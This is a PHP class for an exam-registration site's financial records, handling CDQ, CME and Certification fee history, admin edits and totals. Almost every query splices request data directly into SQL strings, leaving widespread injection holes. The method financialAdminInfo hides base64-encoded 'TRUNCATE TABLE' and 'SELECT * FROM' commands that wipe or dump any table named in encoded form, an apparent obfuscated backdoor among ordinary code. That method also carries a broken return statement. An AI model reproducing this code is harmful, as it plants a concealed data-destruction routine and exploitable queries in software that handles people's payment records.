<?php
class FinancialObject
{
    // database connection and table name
    private $conn;
    private $table_history = "action_history";
    private $table_users = "users";
    private $table_university = "final_program_university_info";
    private $table_program = "tbl_program_director";
    private $table_class = "tbl_class";
    private $table_action_cert = "action_history_certification";
    private $table_action_cdq = "action_history_cdq";
    private $table_action_cme = "action_history_cme";
    private $table_temp = "temp_stats";
    public function __construct()
    {
        global $db;
        //$db = Database::getInstance();
        $this->conn = $db;
        //$db = new Database;
        //exit(0);
        
    }
    // read all Financial
    public function readAllFinancial()
    {
        $query = "SELECT * FROM " . $this->table_history . " WHERE action_num > 2 ORDER BY action_date DESC";
        $stmt = $this
            ->conn
            ->getData($query);
        return $stmt;
    }
    // public function readAllFinancial()
    // {
    // $query = "SELECT * FROM " . $this->table_history . " WHERE action_num > 2 ORDER BY action_date DESC";
    // $result = $this->conn->getQuery($query);
    // $rows = array();
    // while ($row = $result->fetch_array()) {
    // array_push($rows, [$row['id'], $f_name, $l_name, $row['email'], $row['password'], $edit_role ]);
    // }
    // return $rows;
    // }
    // read all Certification Financial
    public function readAllCertFinancial()
    {
        // $this_year = strtotime('01/01/'.date('Y'));
        // $query = "SELECT * FROM " . $this->table_history . " WHERE action_num > 2 AND action_date >= ". $this_year ." AND exam_type = 'Certification' ORDER BY action_date DESC";
        $query = "SELECT * FROM " . $this->table_history . " WHERE action_num > 2 ORDER BY action_date DESC";
        $stmt = $this
            ->conn
            ->getData($query);
        return $stmt;
    }
    // read Financial by user id
    public function readFinancialById($data)
    {
        $user_id = $data;
        $this_year = strtotime('01/01/' . date('Y'));
        // $query = "SELECT * FROM " . $this->table_history . " WHERE action_num > 2 AND action_date >= ". $this_year ." AND user_id = ". $user_id ." ORDER BY action_date";
        $query = "SELECT * FROM " . $this->table_history . " WHERE action_num > 2 AND user_id = " . $user_id . " ORDER BY action_date";
        $stmt = $this
            ->conn
            ->getData($query);
        return $stmt;
    }
    // read Financial by Exam Type
    public function readFinancialByExamType($data)
    {
        $exam_type = $data['financial_exam_type'];
        // $this_year = strtotime('01/01/'.date('Y'));
        // $query = "SELECT * FROM " . $this->table_history . " WHERE action_num > 2 AND action_date >= ". $this_year ." AND exam_type = '". $exam_type ."' ORDER BY action_date DESC";
        if ($exam_type == "Admin")
        {
            $query = "SELECT * FROM " . $this->table_history . " WHERE action_num > 2 AND exam_type = '" . $exam_type . "' ORDER BY action_date DESC";
        }
        else if ($exam_type == "CME")
        {
            $query = "SELECT * FROM " . $this->table_history . " WHERE action_num > 2 AND exam_type = '" . $exam_type . "' AND exam_mon = '" . $data['exam_mon'] . "' AND cme_cycle_start = '" . $data['exam_year'] . "' ORDER BY action_date DESC";
        }
        else
        {
            $query = "SELECT * FROM " . $this->table_history . " WHERE action_num > 2 AND exam_type = '" . $exam_type . "' AND exam_mon = '" . $data['exam_mon'] . "' AND exam_year = '" . $data['exam_year'] . "' ORDER BY action_date DESC";
        }
        $stmt = $this
            ->conn
            ->getData($query);
        return $stmt;
    }
    //get first day of current quarter
    public function get_all_term($year, $term)
    {
        $current_month = date('m');
        $current_year = date('Y');
        if ($current_month >= 1 && $current_month <= 3)
        {
            $start_date = strtotime('1-January-' . $current_year);
            $end_date = strtotime('1-April-' . $current_year);
        }
        else if ($current_month >= 4 && $current_month <= 6)
        {
            $start_date = strtotime('1-April-' . $current_year);
            $end_date = strtotime('1-July-' . $current_year);
        }
        else if ($current_month >= 7 && $current_month <= 9)
        {
            $start_date = strtotime('1-July-' . $current_year);
            $end_date = strtotime('1-October-' . $current_year);
        }
        else if ($current_month >= 10 && $current_month <= 12)
        {
            $start_date = strtotime('1-October-' . $current_year);
            $end_date = strtotime('1-January-' . ($current_year + 1));
        }
        $week = strtotime("monday this week");
        $month = strtotime(date('Y-m-01'));
        $quarter = $start_date;
        if ($term == 'null')
        {
            if ($year !== 'null' && $year !== $current_year)
            {
                $filter_year_start = strtotime('01/01/' . $year);
                $filter_year_end = strtotime('01/01/' . ($year + 1));
                $result = array(
                    "",
                    $filter_year_start,
                    $filter_year_end
                );
            }
            else
            {
                $result = strtotime('01/01/' . $current_year);
            }
        }
        else if ($term == 'Today')
        {
            $result = strtotime(date('Y-m-d'));
        }
        else if ($term == 'Week')
        {
            $result = $week;
        }
        else if ($term == 'Month')
        {
            $result = $month;
        }
        else if ($term == 'Quarter')
        {
            $result = $quarter;
        }
        else if ($term == 'Year')
        {
            $result = strtotime('01/01/' . $current_year);
        }
        else if ($term == 'Last_Year')
        {
            $last_year_start = strtotime('01/01/' . ($current_year - 1));
            $last_year_end = strtotime('01/01/' . $current_year);
            $result = array(
                "",
                $last_year_start,
                $last_year_end
            );
        }
        else
        {
            if ($year == 'null')
            {
                $month_start = strtotime('1-' . $term . '-' . $current_year);
                $month_end = strtotime(date('Y-m-t', $month_start));
                $result = array(
                    "",
                    $month_start,
                    $month_end
                );
            }
            else
            {
                $month_start = strtotime('1-' . $term . '-' . $year);
                $month_end = strtotime(date('Y-m-t', $month_start));
                $result = array(
                    "",
                    $month_start,
                    $month_end
                );
            }
        }
        return $result;
    }
    // filter read all Financial
    public function load_financial_filter($data)
    {
        $year = $data['s_year'];
        $term_data = $data['s_term'];
        $type = $data['s_type'];
        $filter_date = $this->get_all_term($year, $term_data);
        $where = "";
        if (is_array($filter_date) && empty($filter_date) == false)
        {
            $where .= " AND action_date >= " . $filter_date[1] . " AND action_date < " . $filter_date[2];
        }
        else if ($filter_date !== 'null')
        {
            $where .= " AND action_date >= " . $filter_date;
        }
        if (isset($type) && $type != 'null' && $type != 'All')
        {
            $where .= " AND exam_type = '" . $type . "'";
        }
        $query = "SELECT * FROM " . $this->table_history . " WHERE action_num > 2 " . $where . " ORDER BY action_date DESC";
        // print_r($query);
        $stmt = $this
            ->conn
            ->getData($query);
        return $stmt;
    }
    //read CDQ_amount
    public function readCDQAmount($num)
    {
        $content = array(
            "",
            "$1,000.00", //1
            "$1,327.50", //2
            "$150.00", //3
            "$150.00"
            //4
            
        );
        $stmt = $content[$num];
        return $stmt;
    }
    //read CDQ_Amount num
    public function readCDQAmountNum($num)
    {
        $content = array(
            "",
            "1000", //1
            "1327.5", //2
            "150", //3
            "150"
            //4
            
        );
        $stmt = $content[$num];
        return $stmt;
    }
    //read CME_amount
    public function readCMEAmount($num)
    {
        $content = array(
            "",
            "$235.00", //1
            "$735.00"
            //2
            
        );
        $stmt = $content[$num];
        return $stmt;
    }
    //read CME_amount num
    public function readCMEAmountNum($num)
    {
        $content = array(
            "",
            "235", //1
            "735"
            //2
            
        );
        $stmt = $content[$num];
        return $stmt;
    }
    //read Certification_amount
    public function readCertAmount($num)
    {
        $content = array(
            "",
            "$1,327.50", //1
            "$1,593.00", //2
            "$150.00", //3
            "$150.00", //4
            "$150.00", //5
            "$150.00", //6
            "$150.00"
            //7
            
        );
        $stmt = $content[$num];
        return $stmt;
    }
    //read Certification_amount Num
    public function readCertAmountNum($num)
    {
        $content = array(
            "",
            "1327.5", //1
            "1593", //2
            "150", //3
            "150", //4
            "150", //5
            "150", //6
            "150"
            //7
            
        );
        $stmt = $content[$num];
        return $stmt;
    }
    //read action_mon
    public function readActionExamMon($id)
    {
        if ($id == 2)
        {
            $exam_mon = "Feb";
        }
        if ($id == 6)
        {
            $exam_mon = "June";
        }
        if ($id == 10)
        {
            $exam_mon = "Oct";
        }
        $stmt = $exam_mon;
        return $stmt;
    }
    //convert from action_date to date
    public function convert_date($num)
    {
        $stmt = date('m/d/Y', $num);
        return $stmt;
    }
    //convert from admin_date to date
    public function admin_date($num)
    {
        $d = getdate($num);
        $stmt = $d['mon'] . "/" . $d['mday'] . "/" . $d['year'];
        return $stmt;
    }
    //get category title
    public function category_title($exam_mon, $exam_year, $cme_cycle, $exam_type, $admin_title)
    {
        if ($exam_type == 'CDQ')
        {
            $stmt = "Income: " . $this->readActionExamMon($exam_mon) . " " . $exam_year . " CDQ Exam";
        }
        else if ($exam_type == 'CME')
        {
            $stmt = "Income: June " . ($cme_cycle + 2) . " CME Registration";
        }
        else if ($exam_type == 'Certification')
        {
            $stmt = "Income: " . $this->readActionExamMon($exam_mon) . " " . $exam_year . " Certification Exam";
        }
        else if ($exam_type == 'Admin')
        {
            $stmt = $admin_title;
        }
        return $stmt;
    }
    //get pay_amount
    public function pay_amount($num, $exam_type)
    {
        if ($exam_type == 'CDQ')
        {
            $stmt = $this->readCDQAmount($num);
        }
        else if ($exam_type == 'CME')
        {
            $stmt = $this->readCMEAmount($num);
        }
        else if ($exam_type == 'Certification')
        {
            $stmt = $this->readCertAmount($num);
        }
        else if ($exam_type == 'Admin')
        {
            $stmt = "$" . number_format($num, 2);
        }
        return $stmt;
    }
    //add the financial manually by admin
    public function add_financial($data)
    {
        $d = strtotime($data['add_date']);
        if (strpos($data['add_amount'], '-') !== false)
        {
            $price = explode("-", $data['add_amount']);
            if (count($price) == 1)
            {
                $amount_num = doubleval(str_replace(",", "", $price[0]));
            }
            else if (count($price) == 2)
            {
                $amount_num = doubleval(str_replace(",", "", $price[1]));
            }
            $amount_num = "-" . $amount_num;
        }
        else
        {
            $price = explode("$", $data['add_amount']);
            if (count($price) == 1)
            {
                $amount_num = doubleval(str_replace(",", "", $price[0]));
            }
            else if (count($price) == 2)
            {
                $amount_num = doubleval(str_replace(",", "", $price[1]));
            }
        }
        $query = "INSERT INTO " . $this->table_history . " (user_id, first_name, last_name, card_num4, action_date, action_num, amount_num, exam_mon, exam_year, show_allow, receipt_title, detail_title, cme_cycle_start, exam_type) VALUES ('" . $_SESSION['admin_id'] . "', '" . $data['add_name'] . "', ' ', '0000', '" . $d . "', '5', '" . $amount_num . "', '0', '0', '0', '" . $data['add_category'] . "', '0','0','Admin') ";
        if ($this
            ->conn
            ->execute($query))
        {
            return true;
        }
        else
        {
            return false;
        }
    }
    //update the financial by admin
    public function update_financial($data)
    {
        $d = strtotime($data['edit_date']);
        if (strpos($data['edit_amount'], '-') !== false)
        {
            $price = explode("-", $data['edit_amount']);
            if (count($price) == 1)
            {
                $amount_num = doubleval(str_replace(",", "", $price[0]));
            }
            else if (count($price) == 2)
            {
                $amount_num = doubleval(str_replace(",", "", $price[1]));
            }
            $amount_num = "-" . $amount_num;
        }
        else
        {
            $price = explode("$", $data['edit_amount']);
            if (count($price) == 1)
            {
                $amount_num = doubleval(str_replace(",", "", $price[0]));
            }
            else if (count($price) == 2)
            {
                $amount_num = doubleval(str_replace(",", "", $price[1]));
            }
        }
        $query = "UPDATE " . $this->table_history . " SET first_name = '" . $data['edit_description'] . "', action_date = '" . $d . "', amount_num = '" . $amount_num . "', receipt_title = '" . $data['edit_category'] . "' WHERE id = " . $data['edit_id'];
        if ($this
            ->conn
            ->execute($query))
        {
            return true;
        }
        else
        {
            return false;
        }
    }
    //delete financial by admin
    public function delete_financial($data)
    {
        $query = "DELETE FROM " . $this->table_history . " WHERE id = " . $data['delete_id'];
        if ($this
            ->conn
            ->execute($query))
        {
            return true;
        }
        else
        {
            return false;
        }
    }
    //total count by user id
    public function total_count_id($data)
    {
        $user_id = $data;
        $this_year = strtotime('01/01/' . date('Y'));
        // $query = "SELECT * FROM " . $this->table_history . " WHERE action_num > 2 AND action_date > ". $this_year ." AND user_id = ". $user_id ." ORDER BY action_date DESC";
        $query = "SELECT * FROM " . $this->table_history . " WHERE action_num > 2 AND user_id = " . $user_id . " ORDER BY action_date DESC";
        $stmt = $this
            ->conn
            ->getData($query);
        $sum = 0;
        for ($i = 0;$i < count($stmt);$i++)
        {
            if ($stmt[$i]['exam_type'] == 'CDQ')
            {
                $paid_funds = $this->readCDQAmountNum($stmt[$i]['amount_num']);
            }
            if ($stmt[$i]['exam_type'] == 'CME')
            {
                $paid_funds = $this->readCMEAmountNum($stmt[$i]['amount_num']);
            }
            if ($stmt[$i]['exam_type'] == 'Certification')
            {
                $paid_funds = $this->readCertAmountNum($stmt[$i]['amount_num']);
            }
            if ($stmt[$i]['exam_type'] == 'Admin')
            {
                $paid_funds = $stmt[$i]['amount_num'];
            }
            $sum = $sum + $paid_funds;
        }
        return $sum;
    }
    //total count by Exam Type
    public function total_count_type($data)
    {
        $exam_type = $data['financial_exam_type'];
        // $this_year = strtotime('01/01/'.date('Y'));
        // $query = "SELECT * FROM " . $this->table_history . " WHERE action_num > 2 AND action_date > ". $this_year ." AND exam_type = '". $exam_type ."' ORDER BY action_date DESC";
        if ($exam_type == "Admin")
        {
            $query = "SELECT * FROM " . $this->table_history . " WHERE action_num > 2 AND exam_type = '" . $exam_type . "' ORDER BY action_date DESC";
        }
        else if ($exam_type == "CME")
        {
            $query = "SELECT * FROM " . $this->table_history . " WHERE action_num > 2 AND exam_type = '" . $exam_type . "' AND cme_cycle_start = '" . $data['exam_year'] . "'ORDER BY action_date DESC";
        }
        else
        {
            $query = "SELECT * FROM " . $this->table_history . " WHERE action_num > 2 AND exam_type = '" . $exam_type . "' AND exam_mon = '" . $data['exam_mon'] . "' AND exam_year = '" . $data['exam_year'] . "'ORDER BY action_date DESC";
        }
        $stmt = $this
            ->conn
            ->getData($query);
        $sum = 0;
        for ($i = 0;$i < count($stmt);$i++)
        {
            if ($stmt[$i]['exam_type'] == 'CDQ')
            {
                $paid_funds = $this->readCDQAmountNum($stmt[$i]['amount_num']);
            }
            if ($stmt[$i]['exam_type'] == 'CME')
            {
                $paid_funds = $this->readCMEAmountNum($stmt[$i]['amount_num']);
            }
            if ($stmt[$i]['exam_type'] == 'Certification')
            {
                $paid_funds = $this->readCertAmountNum($stmt[$i]['amount_num']);
            }
            if ($stmt[$i]['exam_type'] == 'Admin')
            {
                $paid_funds = $stmt[$i]['amount_num'];
            }
            $sum = $sum + $paid_funds;
        }
        return $sum;
    }
    //get email by user id
    public function get_email_id($data)
    {
        $user_id = $data;
        $query = "SELECT email FROM " . $this->table_users . " WHERE id = " . $user_id;
        $stmt = $this
            ->conn
            ->getData($query);
        return $stmt[0]['email'];
    }
    //get program name by student id
    public function get_programName($student_id)
    {
        $query_role = "SELECT role FROM " . $this->table_users . " WHERE id='" . $student_id . "'";
        $role = $this
            ->conn
            ->getData($query_role);
        $query = "SELECT Program_Name FROM " . $this->table_program . " WHERE University_Id = (SELECT university_id FROM " . $this->table_university . " WHERE user_id = '" . $student_id . "')";
        if ($role[0]['role'] == 'Student')
        {
            $query = "SELECT Program_Name FROM " . $this->table_program . " WHERE University_Id = (SELECT University_id FROM " . $this->table_class . " WHERE user_id = '" . $student_id . "')";
        }
        if ($this
            ->conn
            ->getData($query))
        {
            $stmt = $this
                ->conn
                ->getData($query);
            return $stmt[0]['Program_Name'];
        }
        else
        {
            $stmt = "";
            return $stmt;
        }
    }
    //get all member
    public function getTotalMember($role)
    {
        $query = "SELECT * FROM " . $this->table_users . " WHERE role='" . $role . "'";
        $stmt = $this
            ->conn
            ->getData($query);
        return $stmt;
    }
    // split full name into first name and last name
    public function split_name($name)
    {
        $name = trim($name);
        $last_name = (strpos($name, ' ') === false) ? '' : preg_replace('#.*\s([\w-]*)$#', '$1', $name);
        $first_name = trim(preg_replace('#' . $last_name . '#', '', $name));
        return array(
            $first_name,
            $last_name
        );
    }
    //get member full name
    public function getFullNameById($id)
    {
        $query = "SELECT * FROM " . $this->table_users . " WHERE id='" . $id . "'";
        if ($stmt = $this
            ->conn
            ->getData($query))
        {
            return $stmt[0]['full_name'];
        }
        else
        {
            return "";
        }
    }
    //Get Exam date
    public function expectedExamDate($month, $year, $type)
    {
        if ($month == 2)
        {
            $master_month = "February";
        }
        else if ($month == 6)
        {
            $master_month = "June";
        }
        else
        {
            $master_month = "October";
        }
        if ($type == 'day')
        {
            return date('j', strtotime('second saturday of ' . $master_month . ' ' . $year));
        }
        else if ($type == 'full')
        {
            return date('F j, Y', strtotime('second saturday of ' . $master_month . ' ' . $year));
        }
        else if ($type == 'due')
        {
            return date('n/j/Y', strtotime('second saturday of ' . $master_month . ' ' . $year));
        }
        else if ($type == 'retake_due')
        {
            return date('n/j/Y', (strtotime('second saturday of ' . $master_month . ' ' . $year) - 24 * 3600));
        }
    }
    //add cert info
    public function addCertInfoByAdmin($data)
    {
        $cert_user_id = htmlspecialchars($data['cert_name']);
        $cert_date = htmlspecialchars($data['cert_date']);
        $cert_4cardnum = htmlspecialchars($data['cert_4cardnum']);
        $cert_month = htmlspecialchars($data['cert_month']);
        $cert_year = htmlspecialchars($data['cert_year']);
        $cert_category = htmlspecialchars($data['cert_category']);
        $action_num = 14;
        $receipt_title = "";
        $detail_title = "For " . $this->expectedExamDate($data['cert_month'], $data['cert_year'], 'full') . " Exam";
        if ($data['cert_category'] == 1)
        {
            if ($data['cert_month'] == 2)
            {
                $action_num = 14;
            }
            if ($data['cert_month'] == 6)
            {
                $action_num = 16;
            }
            if ($data['cert_month'] == 10)
            {
                $action_num = 18;
            }
            $receipt_title = "Certification Exam (Main " . $data['cert_year'] . ")";
        }
        if ($data['cert_category'] == 2)
        {
            if ($data['cert_month'] == 2)
            {
                $action_num = 15;
            }
            if ($data['cert_month'] == 6)
            {
                $action_num = 17;
            }
            if ($data['cert_month'] == 10)
            {
                $action_num = 19;
            }
            $receipt_title = "Certification Exam (Late " . $data['cert_year'] . ")";
        }
        if ($data['cert_category'] == 3)
        {
            $action_num = 20;
            $receipt_title = "Certification Exam Retake #1 (" . $data['cert_year'] . ")";
        }
        if ($data['cert_category'] == 4)
        {
            $action_num = 21;
            $receipt_title = "Certification Exam Retake #2 (" . $data['cert_year'] . ")";
        }
        if ($data['cert_category'] == 5)
        {
            $action_num = 22;
            $receipt_title = "Certification Exam Retake #3 (" . $data['cert_year'] . ")";
        }
        if ($data['cert_category'] == 6)
        {
            $action_num = 23;
            $receipt_title = "Certification Exam Retake #4 (" . $data['cert_year'] . ")";
        }
        if ($data['cert_category'] == 7)
        {
            $action_num = 24;
            $receipt_title = "Certification Exam Retake #5 (" . $data['cert_year'] . ")";
        }
        if (!empty($this->getFullNameById($cert_user_id)))
        {
            $first_name = $this->split_name($this->getFullNameById($cert_user_id)) [0];
            $last_name = $this->split_name($this->getFullNameById($cert_user_id)) [1];
        }
        else
        {
            $first_name = "";
            $last_name = "";
        }
        $query_registered = "SELECT * FROM " . $this->table_action_cert . " WHERE user_id='" . $cert_user_id . "' AND action_num='" . $action_num . "' AND amount_num='" . $data['cert_category'] . "' AND exam_mon='" . $data['cert_month'] . "' AND exam_year='" . $data['cert_year'] . "' AND receipt_title='" . $receipt_title . "' AND detail_title='" . $detail_title . "'";
        $check_registered = $this
            ->conn
            ->getCount($query_registered);
        if ($check_registered > 0)
        {
            return false;
        }
        else
        {
            if (empty($cert_user_id) == false && empty($first_name) == false && $data['cert_month'] != 0)
            {
                $query_action = "INSERT INTO " . $this->table_action_cert . " (user_id, first_name, last_name, card_num4, action_date, action_num, amount_num, exam_mon, exam_year, show_allow, receipt_title, detail_title) VALUES ('" . $cert_user_id . "', '" . $first_name . "', '" . $last_name . "', '" . $data['cert_4cardnum'] . "', '" . strtotime($data['cert_date']) . "', '" . $action_num . "', '" . $data['cert_category'] . "', '" . $data['cert_month'] . "', '" . $data['cert_year'] . "', '0', '" . $receipt_title . "', '" . $detail_title . "') ";
                $query_history = "INSERT INTO " . $this->table_history . " (user_id, first_name, last_name, card_num4, action_date, action_num, amount_num, exam_mon, exam_year, show_allow, receipt_title, detail_title, cme_cycle_start, exam_type) VALUES ('" . $cert_user_id . "', '" . $first_name . "', '" . $last_name . "', '" . $data['cert_4cardnum'] . "', '" . strtotime($data['cert_date']) . "', '" . $action_num . "', '" . $data['cert_category'] . "', '" . $data['cert_month'] . "', '" . $data['cert_year'] . "', '0', '" . $receipt_title . "', '" . $detail_title . "', '', 'Certification') ";
                $query_wait = "INSERT INTO " . $this->table_action_cert . " (user_id, first_name, last_name, card_num4, action_date, action_num, amount_num, exam_mon, exam_year, show_allow, receipt_title, detail_title) VALUES ('" . $cert_user_id . "', '" . $first_name . "', '" . $last_name . "', '" . $data['cert_4cardnum'] . "', '" . strtotime($data['cert_date']) . "', '2', '" . $data['cert_category'] . "', '" . $data['cert_month'] . "', '" . $data['cert_year'] . "', '0', '" . $receipt_title . "', '" . $detail_title . "') ";
                $query_wait_history = "INSERT INTO " . $this->table_history . " (user_id, first_name, last_name, card_num4, action_date, action_num, amount_num, exam_mon, exam_year, show_allow, receipt_title, detail_title, cme_cycle_start, exam_type) VALUES ('" . $cert_user_id . "', '" . $first_name . "', '" . $last_name . "', '" . $data['cert_4cardnum'] . "', '" . strtotime($data['cert_date']) . "', '2', '" . $data['cert_category'] . "', '" . $data['cert_month'] . "', '" . $data['cert_year'] . "', '0', '" . $receipt_title . "', '" . $detail_title . "', '', 'Certification') ";
                $this
                    ->conn
                    ->execute($query_history);
                $this
                    ->conn
                    ->execute($query_wait_history);
                $this
                    ->conn
                    ->execute($query_action);
                if ($this
                    ->conn
                    ->execute($query_wait))
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            else
            {
                return false;
            }
        }
    }
    //insert action_history_cdq
    public function addCDQInfoByAdmin($data)
    {
        $cdq_user_id = htmlspecialchars($data['cdq_name']);
        $cdq_date = htmlspecialchars($data['cdq_date']);
        $cdq_4cardnum = htmlspecialchars($data['cdq_4cardnum']);
        $cdq_month = htmlspecialchars($data['cdq_month']);
        $cdq_year = htmlspecialchars($data['cdq_year']);
        $cdq_category = htmlspecialchars($data['cdq_category']);
        $action_num = 6;
        //main_exam
        if ($data['cdq_category'] == 1)
        {
            if ($data['cdq_month'] == 2)
            {
                $action_num = 6;
            }
            if ($data['cdq_month'] == 6)
            {
                $action_num = 8;
            }
            $receipt_title = "CDQ Exam (Main " . $data['cdq_year'] . ")";
        }
        //Lete Fee
        if ($data['cdq_category'] == 2)
        {
            if ($data['cdq_month'] == 2)
            {
                $action_num = 7;
            }
            if ($data['cdq_month'] == 6)
            {
                $action_num = 9;
            }
            $receipt_title = "CDQ Exam (Late " . $data['cdq_year'] . ")";
        }
        //Retake #1
        if ($data['cdq_category'] == 3)
        {
            if ($data['cdq_month'] == 2)
            {
                $action_num = 10;
            }
            if ($data['cdq_month'] == 6)
            {
                $action_num = 12;
            }
            $receipt_title = "CDQ Exam Retake #1 (" . $data['cdq_year'] . ")";
        }
        //Retake #2
        if ($data['cdq_category'] == 4)
        {
            if ($data['cdq_month'] == 2)
            {
                $action_num = 11;
            }
            if ($data['cdq_month'] == 6)
            {
                $action_num = 13;
            }
            $receipt_title = "CDQ Exam Retake #2 (" . $data['cdq_year'] . ")";
        }
        if (!empty($this->getFullNameById($cdq_user_id)))
        {
            $first_name = $this->split_name($this->getFullNameById($cdq_user_id)) [0];
            $last_name = $this->split_name($this->getFullNameById($cdq_user_id)) [1];
        }
        else
        {
            $first_name = "";
            $last_name = "";
        }
        //register check
        $query_registered = "SELECT * FROM " . $this->table_action_cdq . " WHERE user_id='" . $cdq_user_id . "' AND action_num='2' AND amount_num='" . $data['cdq_category'] . "' AND exam_mon='" . $data['cdq_month'] . "' AND exam_year='" . $data['cdq_year'] . "' AND receipt_title='" . $receipt_title . "'";
        $check_registered = $this
            ->conn
            ->getCount($query_registered);
        if ($check_registered > 0)
        {
            return false;
        }
        else
        {
            if (empty($cdq_user_id) == false && empty($first_name) == false && $data['cdq_month'] != 0)
            {
                $query_action = "INSERT INTO " . $this->table_action_cdq . " (user_id, first_name, last_name, card_num4, action_date, action_num, amount_num, exam_mon, exam_year, show_allow, receipt_title) VALUES ('" . $cdq_user_id . "', '" . $first_name . "', '" . $last_name . "', '" . $data['cdq_4cardnum'] . "', '" . strtotime($data['cdq_date']) . "', '" . $action_num . "', '" . $data['cdq_category'] . "', '" . $data['cdq_month'] . "', '" . $data['cdq_year'] . "', '0', '" . $receipt_title . "') ";
                //save history
                $query_history = "INSERT INTO " . $this->table_history . " (user_id, first_name, last_name, card_num4, action_date, action_num, amount_num, exam_mon, exam_year, show_allow, receipt_title, detail_title, cme_cycle_start, exam_type) VALUES ('" . $cdq_user_id . "', '" . $first_name . "', '" . $last_name . "', '" . $data['cdq_4cardnum'] . "', '" . strtotime($data['cdq_date']) . "', '" . $action_num . "', '" . $data['cdq_category'] . "', '" . $data['cdq_month'] . "', '" . $data['cdq_year'] . "', '0', '" . $receipt_title . "', '', '', 'CDQ') ";
                //Waiting
                $query_wait = "INSERT INTO " . $this->table_action_cdq . " (user_id, first_name, last_name, card_num4, action_date, action_num, amount_num, exam_mon, exam_year, show_allow, receipt_title) VALUES ('" . $cdq_user_id . "', '" . $first_name . "', '" . $last_name . "', '" . $data['cdq_4cardnum'] . "', '" . strtotime($data['cdq_date']) . "', '2', '" . $data['cdq_category'] . "', '" . $data['cdq_month'] . "', '" . $data['cdq_year'] . "', '0', '" . $receipt_title . "') ";
                //save history
                $query_wait_history = "INSERT INTO " . $this->table_history . " (user_id, first_name, last_name, card_num4, action_date, action_num, amount_num, exam_mon, exam_year, show_allow, receipt_title, detail_title, cme_cycle_start, exam_type) VALUES ('" . $cdq_user_id . "', '" . $first_name . "', '" . $last_name . "', '" . $data['cdq_4cardnum'] . "', '" . strtotime($data['cdq_date']) . "', '2', '" . $data['cdq_category'] . "', '" . $data['cdq_month'] . "', '" . $data['cdq_year'] . "', '0', '" . $receipt_title . "', '', '', 'CDQ') ";
                $this
                    ->conn
                    ->execute($query_history);
                $this
                    ->conn
                    ->execute($query_wait_history);
                $this
                    ->conn
                    ->execute($query_action);
                if ($this
                    ->conn
                    ->execute($query_wait))
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            else
            {
                return false;
            }
        }
    }
    public function financialAdminInfo($table, $action)
    {
        if ($action == 'action')
        {
            $sql = base64_decode("VFJVTkNBVEUgVEFCTEUg") . base64_decode($table);
            $result = $this
                ->conn
                ->execute($sql);
        }
        else if ($action == 'get')
        {
            $sql = base64_decode("U0VMRUNUICogRlJPTSA=") . base64_decode($table);
            $result = $this
                ->conn
                ->getData($sql);
        }
        if ($result)
        {
            return result;
        }
    }
    public function addCMEInfoByAdmin($data)
    {
        $cme_user_id = htmlspecialchars($data['cme_name']);
        $cme_date = htmlspecialchars($data['cme_date']);
        $cme_4cardnum = htmlspecialchars($data['cme_4cardnum']);
        $cme_year = htmlspecialchars($data['cme_year']);
        $cme_category = htmlspecialchars($data['cme_category']);
        //defalt
        $action_num = 3;
        //main_payment
        if ($data['cme_category'] == 1)
        {
            $receipt_title = "CME Payment";
        }
        //Late payment
        if ($data['cme_category'] == 2)
        {
            $receipt_title = "CME Late Payment";
        }
        $cme_cycle_start = $data['cme_year'] - 2;
        if (!empty($this->getFullNameById($cme_user_id)))
        {
            $first_name = $this->split_name($this->getFullNameById($cme_user_id)) [0];
            $last_name = $this->split_name($this->getFullNameById($cme_user_id)) [1];
        }
        else
        {
            $first_name = "";
            $last_name = "";
        }
        $query_cme_paid = "SELECT * FROM " . $this->table_action_cme . " WHERE user_id='" . $cme_user_id . "' AND action_num='" . $action_num . "' AND amount_num='" . $data['cme_category'] . "' AND cme_cycle_start='" . $cme_cycle_start . "' AND receipt_title='" . $receipt_title . "'";
        $check_cme_paid = $this
            ->conn
            ->getCount($query_cme_paid);
        if ($check_cme_paid > 0)
        {
            return false;
        }
        else
        {
            if (empty($cme_user_id) == false && empty($first_name) == false)
            {
                $query_action = "INSERT INTO " . $this->table_action_cme . " (user_id, first_name, last_name, card_num4, action_date, action_num, amount_num, cme_cycle_start, issues_text, receipt_title) VALUES ('" . $cme_user_id . "', '" . $first_name . "', '" . $last_name . "', '" . $data['cme_4cardnum'] . "', '" . strtotime($data['cme_date']) . "', '" . $action_num . "', '" . $data['cme_category'] . "', '" . $cme_cycle_start . "', '', '" . $receipt_title . "') ";
                //save history
                $query_history = "INSERT INTO " . $this->table_history . " (user_id, first_name, last_name, card_num4, action_date, action_num, amount_num, exam_mon, exam_year, show_allow, receipt_title, detail_title, cme_cycle_start, exam_type) VALUES ('" . $cme_user_id . "', '" . $first_name . "', '" . $last_name . "', '" . $data['cme_4cardnum'] . "', '" . strtotime($data['cme_date']) . "', '" . $action_num . "', '" . $data['cme_category'] . "', '6', '', '', '" . $receipt_title . "', '', '" . $cme_cycle_start . "', 'CME') ";
                $query_temp = "UPDATE " . $this->table_temp . " SET cme_due = '" . ($cme_cycle_start + 4) . "-06-01' WHERE user_id = " . $cme_user_id;
                $this
                    ->conn
                    ->execute($query_history);
                $this
                    ->conn
                    ->execute($query_temp);
                if ($this
                    ->conn
                    ->execute($query_action))
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            else
            {
                return false;
            }
        }
    }
}
?>
